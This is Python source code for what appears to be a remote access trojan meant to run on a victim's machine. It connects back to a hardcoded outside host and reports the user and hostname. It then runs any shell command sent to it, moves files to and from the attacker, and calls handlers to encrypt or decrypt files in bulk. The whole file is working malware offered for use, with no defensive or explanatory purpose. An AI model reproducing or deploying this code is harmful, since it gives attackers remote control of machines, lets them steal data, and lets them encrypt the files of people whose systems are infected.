1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
#!/usr/bin/python

############################
## Runs on Traget Machine ##
############################

try:
	import sys
	import pip
	import time
	import socket
	import getpass
	import subprocess
	import base64
	from Crypto.Cipher import AES
	from Crypto import Random
	from client.core.secure.RAW import *
except ImportError as e:
	#pip = lambda : os.system('pip install' + str(e)[15:])
	pip =  lambda : pip.main(['install', str(e)[15:]])
	pip()


class RAT(RAW):

	_sock = None
	_port = None
	_loop = None
	_info = None
	_raw = None

	BUFFER = 1024
	SHORT_INTERVAL = 0.1
	MID_INTERVAL = 0.8
	S_INTERVAL = 3
	LONG_INTERVAL = 10

	SIG = "ACTIVE"
	ACK_SIG = "0x06"
	FLAG = False


	# constructor
	def __init__(self):
		self._raw = RAW.__init__(self)
		self.start()


	# start the service
	def start(cls):
		while True:
			try:
				cls.init()
				cls.connect(cls._loop, cls._port)
				data = cls.receive()
				if(data == cls.SIG):
					cls.FLAG = True
					cls.send(cls._info + os.getcwd() + "> ")
				while(cls.FLAG):
					data = cls.receive()
					data.lower()
					stdoutput = cls.data_handler(data)
					# Send data to server
					stdoutput += "\n" + os.getcwd() + "> "
					stdoutput = stdoutput.decode('gbk').encode('utf-8', 'gb18030')
					cls.send(stdoutput)
				if(data == 'terminate'):
					cls.kill()
					break
			except socket.error as e:
				cls.socket_handler(e)
				continue


	# initializer
	def init(cls):
		# set new socket
		cls._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		# set loopback address
		#cls._loop = "127.0.0.1" #socket.gethostbyname("localhost")
		# domain.ddns.chickenkiller.com
		# flipper.hackquest.com
		#cls._loop = 'flipper.hackquest.com'
		cls._loop = socket.gethostbyname('flipper.hackquest.com')
		# set new port
		#cls._port = 4434
		cls._port = 8080
		cls._info = cls.build_info()


	# get fisrt time interaction info
	def build_info(cls):
		str1 = "\n[+] USER: "
		str2 = "\n[+] HOSTNAME: "
		com1 = "\n\n<!> get more info using 'sys_info' command"
		com2 = "\n<!> terminate the remote host connection using 'terminate' command"
		com3 = "\n<!> press Enter and then Ctrl+C :: remote host connection will keep alive\n\n"
		return "{}{}{}{}{}{}{}".format(str(str1), str(getpass.getuser()), str(str2), str(os.uname()[1]), str(com1), str(com2), str(com3))


	# bind connection
	def connect(cls, addr, port):
		cls._sock.connect((addr, port))


	# receive data
	def receive(cls):
		data = ''
		pkt = cls._sock.recv(cls.BUFFER)
		while(pkt):
			data += pkt
			if(data):
				break
			else:
				pkt = cls._sock.revc(cls.BUFFER)
		return data


	# send data
	def send(cls, cmd):
		cls._sock.sendall(cmd)


	# data handler
	def data_handler(cls, data):
		# check for quit
		if(data == 'quit' or data == 'terminate'):
			cls.send('Quitted...')
			sys.exit(0)
		# check for change directory
		elif(data.startswith('cd ')):
			try:
				os.chdir(data[3:])
				std = ""
			except OSError as e:
				std = cls.os_handler(e)
				pass
		# check for download
		elif(data.startswith('download ')):
			std = cls.upload(data[9:])
		# check for upload
		elif(data.startswith('upload ')):
			std = cls.download(data[7:])
		# send system info
		elif(data.startswith('sys_info')):
			std = cls.drill_down()
		# encrypt all data
		elif(data.startswith('encrypt_all')):
			std = cls._raw.handler(data, "ea")
		# encrypt data
		elif(data.startswith('encrypt ')):
			std = cls._raw.handler(data[8:], "e")
		# decrypt all data
		elif(data.startswith('decrypt_all')):
			std = cls._raw.handler(data, "da")
		# decrypt data
		elif(data.startswith('decrypt ')):
			std = cls._raw.handler(data[8:], "d")
		# bind a shell subprocess
		else:
			proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			std = proc.stdout.read() + proc.stderr.read()
		return std

	def os_handler(cls, err):
		# No such directory
		if(err[0] is 2):
			return str(err)
		# Other errors
		else:
			return str(err)

	# socket error handler
	def socket_handler(cls, error_type):
		# Connection refused
		if(error_type[0] is 61):
			cls.stop()
			time.sleep(cls.LONG_INTERVAL)
			print "CODE: {}\nMSG: {}\n-------".format(str(error_type[0]), str(error_type[1]))
		# Socket is not connected
		if(error_type[0] is 57):
			cls.stop()
			print "CODE: {}\nMSG: {}\n-------".format(str(error_type[0]), str(error_type[1]))
			time.sleep(cls.LONG_INTERVAL)
		# Bad file descriptor
		elif(error_type[0] is 9):
			cls.stop()
			print "CODE: {}\nMSG: {}\n-------".format(str(error_type[0]), str(error_type[1]))
			time.sleep(cls.LONG_INTERVAL)
		# Broken Pipe
		elif(error_type[0] is 32):
			cls.stop()
			print "CODE: {}\nMSG: {}\n-------".format(str(error_type[0]), str(error_type[1]))
			time.sleep(cls.LONG_INTERVAL)
		else:
			cls.stop()
			print "CODE: {}\nMSG: {}".format(str(error_type[0]), str(error_type[1]))
			time.sleep(cls.LONG_INTERVAL)


	# stop socket connection
	def stop(cls):
		cls._sock.close()


	# kill socket connection
	def kill(cls):
		cls._sock.close()
		del(cls._sock)
		sys.exit()


	# download content from server
	def download(cls, fn):
		g = open(fn, 'wb')
		# download file
		fd = cls.receive()
		time.sleep(cls.MID_INTERVAL)
		g.write(fd)
		g.close()
		# let server know we're done..
		return cls.ACK_SIG


	# upload content to server
	def upload(cls, fn):
		filename = unicode(fn, "utf8")
		#bgtr = True
		# file transfer
		try:
			f = open(filename, 'rb')
			while 1:
				fd = f.read()
				if(fd == ''): break
				# begin sending file
				cls.send(fd)
			f.close()
		except:
			time.sleep(cls.SHORT_INTERVAL)
		# let server know we're done..
		time.sleep(cls.MID_INTERVAL)
		cls.send("")
		time.sleep(cls.MID_INTERVAL)
		return cls.ACK_SIG


	# get system info
	def drill_down(cls):
		return "\n"+str(os.uname())+"\n"





def main():
	rat = RAT()


if __name__ == '__main__':
	main()


